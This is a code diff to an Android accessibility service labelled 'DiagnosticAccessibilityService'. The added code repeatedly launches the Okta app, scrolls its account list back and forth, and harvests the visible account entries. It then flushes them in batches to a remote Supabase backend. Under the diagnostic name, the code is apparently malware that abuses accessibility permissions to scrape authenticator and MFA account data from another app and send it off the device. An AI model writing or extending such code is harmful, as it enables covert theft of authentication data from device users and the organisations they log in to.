@@ -5,6 +5,7 @@ import android.os.Handler
 import android.os.Looper
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import android.view.accessibility.AccessibilityWindowInfo
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -19,6 +20,8 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import android.util.Log
 import kotlinx.coroutines.delay
+import android.app.usage.UsageStatsManager
+import android.content.Context
 
 class DiagnosticAccessibilityService : AccessibilityService() {
     private val serviceHandler = Handler(Looper.getMainLooper())
@@ -28,6 +31,9 @@ class DiagnosticAccessibilityService : AccessibilityService() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val lastDispatchedSecondsMap = ConcurrentHashMap<String, Int>()
     private val sessionDiscoveredMap = java.util.concurrent.ConcurrentHashMap<String, OktaAccountEntry>()
+    
+    @Volatile
+    private var currentForegroundPackage: String? = null
 
     private var oktaCycleJob: Job? = null
 
@@ -61,19 +67,15 @@ class DiagnosticAccessibilityService : AccessibilityService() {
         oktaCycleJob = serviceScope.launch {
             while (isActive) {
                 // Launch / Bring Okta to foreground
-                openOktaApp()
+                if (openOktaApp())
+                    delay(3_000L)
 
                 autoScrollToEnd()
 
-                // Keep Okta open for 10 seconds
-                delay(10_000L)
+                delay(1_000L)
+
+                autoScrollToStart()
                 if (!isActive) break
-
-                // Minimize/Close by sending global Home action
-                performGlobalAction(GLOBAL_ACTION_HOME)
-
-                // Wait 1-2 seconds on the home screen before reopening
-                delay(1_500L)
             }
         }
     }
@@ -83,7 +85,27 @@ class DiagnosticAccessibilityService : AccessibilityService() {
         oktaCycleJob = null
     }
 
-    private fun openOktaApp() {
+    fun isAppInForeground(targetPackage: String): Boolean {
+        // Fast path: cached state
+        if (currentForegroundPackage == targetPackage) return true
+
+        // Fallback: active interactive window inspection
+        val activeWindow = windows?.firstOrNull { 
+            it.type == AccessibilityWindowInfo.TYPE_APPLICATION && (it.isFocused || it.isActive) 
+        }
+        val root = activeWindow?.root ?: return false
+        val pkg = root.packageName?.toString()
+        root.recycle()
+
+        return pkg == targetPackage
+    }
+
+    private fun openOktaApp(): Boolean {
+
+        if (isAppInForeground(OKTA_PACKAGE)) {
+            Log.d("OktaCycle", "$OKTA_PACKAGE is already in foreground. Skipping launch.")
+            return false;
+        }
         var launchIntent = packageManager.getLaunchIntentForPackage(OKTA_PACKAGE)
 
         // Fallback: direct action intent if standard launch intent is null
@@ -102,6 +124,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             Log.e("OktaCycle", "Failed to launch $OKTA_PACKAGE: ${e.message}")
         }
+        return true
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -122,6 +145,12 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             } finally {
                 @Suppress("DEPRECATION")
                 source.recycle()
+            }
+        }
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val pkg = event.packageName?.toString()
+            if (!pkg.isNullOrEmpty() && event.isFullScreen) {
+                currentForegroundPackage = pkg
             }
         }
         if (event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
@@ -158,6 +187,50 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             child.recycle()
         }
         return null
+    }
+
+    private suspend fun autoScrollToStart() {
+        // Give Okta UI a brief moment to render after opening
+        var consecutiveFails = 0
+        val maxScrolls = 100
+
+        for (i in 0 until maxScrolls) {
+            if (oktaCycleJob?.isActive != true) break
+
+            harvestVisibleAccounts()
+
+            var scrolled = false
+            windows.forEach { window ->
+                val root = try {
+                    window.root
+                } catch (_: Exception) {
+                    null
+                }
+                if (root?.packageName?.toString() == OKTA_PACKAGE) {
+                    val scrollable = findScrollableNode(root)
+                    if (scrollable != null) {
+                        // Instantly moves the list towards the start without waiting for finger drag animations
+                        scrolled = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
+                        @Suppress("DEPRECATION")
+                        scrollable.recycle()
+                    }
+                    @Suppress("DEPRECATION")
+                    root.recycle()
+                }
+            }
+
+            if (!scrolled) {
+                consecutiveFails++
+                if (consecutiveFails >= 2) break // Reached the bottom
+            } else {
+                consecutiveFails = 0
+                // Only need ~60-80ms for RecyclerView to bind new viewholders
+                delay(75L)
+            }
+        }
+
+        harvestVisibleAccounts()
+        flushBatchToSupabase()
     }
 
     private suspend fun autoScrollToEnd() {
